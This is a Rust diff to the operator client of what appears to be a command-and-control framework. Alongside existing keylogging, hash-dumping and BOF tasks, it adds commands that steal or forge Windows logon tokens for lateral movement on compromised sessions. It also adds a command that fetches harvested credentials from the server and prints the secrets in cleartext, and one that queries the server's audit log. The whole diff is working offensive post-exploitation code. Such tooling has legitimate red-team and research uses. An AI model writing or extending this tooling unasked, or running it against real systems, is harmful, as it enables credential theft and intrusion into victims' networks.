@@ -114,6 +114,22 @@ pub enum Cmd {
     Env { session: String, name: String },
     Keylog { session: String, action: u8 },
     Hashdump { session: String, method: u8 },
+    /// Token operations (lateral movement). steal/make a token, revert
+    /// impersonation, query the current thread identity.
+    StealToken { session: String, pid: u32 },
+    MakeToken {
+        session: String,
+        domain: String,
+        user: String,
+        password: String,
+        logon_type: u8,
+    },
+    Rev2Self { session: String },
+    GetUid { session: String },
+    /// Pull server-side creds (`GET /api/creds`) and print them to the log.
+    FetchCreds { reveal: bool },
+    /// Query the server audit log (`GET /api/audit`) and print to the log.
+    FetchAudit { operator: Option<String>, action: Option<String>, limit: Option<u32> },
     /// Enqueue a BOF (Beacon Object File) task on the given session. `name` is
     /// the COFF entry label shown in the BOF history; `args` the space-separated
     /// arg string (split here to match the server's `Vec<String>`); `data_hex`
@@ -431,6 +447,93 @@ async fn worker_loop(cmd_rx: FromUIReceiver<Cmd>, to_ui: ToUISender<Snapshot>) {
                             pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Hashdump, backoff: Duration::from_millis(500), last_poll: Instant::now() });
                         }
                         Err(e) => log_push(&mut log_buf, &format!("! hashdump: {e}")),
+                    }
+                }
+                Cmd::StealToken { session, pid } => {
+                    let Some((ref srv, ref token)) = server else { continue; };
+                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "stealtoken", "pid": pid }), token).await {
+                        Ok(tid) => {
+                            log_push(&mut log_buf, &format!("[{}] steal_token({pid}) → task {}", short(&session), tid));
+                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("stealtoken".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
+                        }
+                        Err(e) => log_push(&mut log_buf, &format!("! steal_token: {e}")),
+                    }
+                }
+                Cmd::MakeToken { session, domain, user, password, logon_type } => {
+                    let Some((ref srv, ref token)) = server else { continue; };
+                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "maketoken", "domain": domain, "user": user, "password": password, "logon_type": logon_type }), token).await {
+                        Ok(tid) => {
+                            log_push(&mut log_buf, &format!("[{}] make_token({domain}\\{user}) → task {}", short(&session), tid));
+                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("maketoken".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
+                        }
+                        Err(e) => log_push(&mut log_buf, &format!("! make_token: {e}")),
+                    }
+                }
+                Cmd::Rev2Self { session } => {
+                    let Some((ref srv, ref token)) = server else { continue; };
+                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "rev2self" }), token).await {
+                        Ok(tid) => {
+                            log_push(&mut log_buf, &format!("[{}] rev2self → task {}", short(&session), tid));
+                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("rev2self".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
+                        }
+                        Err(e) => log_push(&mut log_buf, &format!("! rev2self: {e}")),
+                    }
+                }
+                Cmd::GetUid { session } => {
+                    let Some((ref srv, ref token)) = server else { continue; };
+                    match enqueue_task(&client, srv, &session, serde_json::json!({ "type": "getuid" }), token).await {
+                        Ok(tid) => {
+                            log_push(&mut log_buf, &format!("[{}] getuid → task {}", short(&session), tid));
+                            pending.push(PendingTask { session, task_id: tid, kind: TaskKind::Generic("getuid".to_string()), backoff: Duration::from_millis(500), last_poll: Instant::now() });
+                        }
+                        Err(e) => log_push(&mut log_buf, &format!("! getuid: {e}")),
+                    }
+                }
+                Cmd::FetchCreds { reveal } => {
+                    let Some((ref srv, ref token)) = server else { continue; };
+                    let url = if reveal { format!("{srv}/api/creds?reveal=1") } else { format!("{srv}/api/creds") };
+                    match authed(client.get(&url), token).send().await {
+                        Ok(resp) => match resp.json::<Vec<serde_json::Value>>().await {
+                            Ok(rows) => {
+                                log_push(&mut log_buf, &format!("server creds: {} record(s)", rows.len()));
+                                for r in rows.iter().take(50) {
+                                    let realm = r.get("realm").and_then(|v| v.as_str()).unwrap_or("");
+                                    let user = r.get("user").and_then(|v| v.as_str()).unwrap_or("");
+                                    let kind = r.get("kind").and_then(|v| v.as_str()).unwrap_or("?");
+                                    let secret = r.get("secret").and_then(|v| v.as_str()).unwrap_or("");
+                                    log_push(&mut log_buf, &format!("  {kind:8} {realm}\\{user}: {secret}"));
+                                }
+                                if rows.len() > 50 {
+                                    log_push(&mut log_buf, &format!("  ... ({} more, use CLI /creds sync for full)", rows.len() - 50));
+                                }
+                            }
+                            Err(e) => log_push(&mut log_buf, &format!("! creds parse: {e}")),
+                        },
+                        Err(e) => log_push(&mut log_buf, &format!("! creds fetch: {e}")),
+                    }
+                }
+                Cmd::FetchAudit { operator, action, limit } => {
+                    let Some((ref srv, ref token)) = server else { continue; };
+                    let mut qs: Vec<String> = Vec::new();
+                    if let Some(op) = &operator { qs.push(format!("operator={op}")); }
+                    if let Some(ac) = &action { qs.push(format!("action={ac}")); }
+                    if let Some(l) = limit { qs.push(format!("limit={l}")); }
+                    let url = if qs.is_empty() { format!("{srv}/api/audit") } else { format!("{srv}/api/audit?{}", qs.join("&")) };
+                    match authed(client.get(&url), token).send().await {
+                        Ok(resp) => match resp.json::<Vec<serde_json::Value>>().await {
+                            Ok(rows) => {
+                                log_push(&mut log_buf, &format!("audit: {} record(s)", rows.len()));
+                                for r in rows.iter().take(50) {
+                                    let seq = r.get("seq").and_then(|v| v.as_u64()).unwrap_or(0);
+                                    let op = r.get("operator").and_then(|v| v.as_str()).unwrap_or("?");
+                                    let act = r.get("action").and_then(|v| v.as_str()).unwrap_or("?");
+                                    let tgt = r.get("target").and_then(|v| v.as_str()).unwrap_or("");
+                                    log_push(&mut log_buf, &format!("  #{seq} {op} {act} {tgt}"));
+                                }
+                            }
+                            Err(e) => log_push(&mut log_buf, &format!("! audit parse: {e}")),
+                        },
+                        Err(e) => log_push(&mut log_buf, &format!("! audit fetch: {e}")),
                     }
                 }
                 Cmd::Bof { session, name, args, data_hex } => {
